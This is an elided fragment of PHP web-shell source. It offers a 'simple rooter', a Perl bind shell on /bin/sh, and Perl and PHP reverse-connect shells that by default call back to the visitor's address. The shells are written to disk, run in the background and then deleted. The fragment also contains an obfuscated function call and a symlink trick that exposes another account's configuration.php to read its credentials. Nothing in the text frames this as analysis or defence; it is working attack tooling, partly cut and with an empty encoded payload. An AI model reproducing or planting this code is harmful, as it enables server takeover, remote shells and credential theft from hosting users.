...
echo "<li>[ <a href='?simple=rooter'>SIMPLE ROOTER</a> ]</li>";
echo "<li>[ <a href='?reverse=connect'>REVERSE CONNECT</a> ]</li>";
...
<br>	<span>Bind port to /bin/sh [perl]</span><br/>
	Port: <input type='text' name='port' value='1945'> <input type=submit name=bpl value='>>'>
<br><br>
		<span>Back-connect  [perl]</span><br/>
	Server: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' value='1945'> <input type=submit name=bcpl value='>>'>
	<br><br>
		<span>Back-connect  [PHP]</span><br/>
	Server: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' value='1945'> <input type=submit name=bcphp value='>>'>
	</form><br><br>";
	if($_POST['bpl']) {
...
$plbc=@fopen('bc.pl','w');
fwrite($plbc,$bc);
$out = exe("perl bc.pl ".$_POST['port']." ".$_POST['server']." 1>/dev/null 2>&1 &");
sleep(1);
echo "<pre>$out\n".exe("ps aux | grep bc.pl")."</pre>";
unlink("bc.pl");
		}
			if($_POST['bcphp']) {
$bec=base64_decode("");
$pbc=@fopen('rev.php','w');
fwrite($pbc,$bec);
$out = exe("php rev.php ".$_POST['server']." ".$_POST['port']);
sleep(1);
echo "<pre>$out\n</pre>";
unlink("rev.php");
}
...
echo'<meta http-equiv="Refresh" content= "0; url=azx.pl">';
 }
...
$v($x.$i.$l.$v.$o,$z,$h);
if($_GET['sym']=="404"){
echo '<center><form method="post"><br>File Target : <input name="fl" value="/home/user/public_html/configuration.php"> <input name="anu" type="submit" value="SYM"></form><br>';if($_POST['anu']){
rmdir("sl");exe("mkdir sl");exe('touch "ReadmeName x.txt" >> sl/.htaccess');exe("ln -s ".$_POST['fl']." sl/x.txt");
echo'<a href=sl>CECK</a>';
}
}
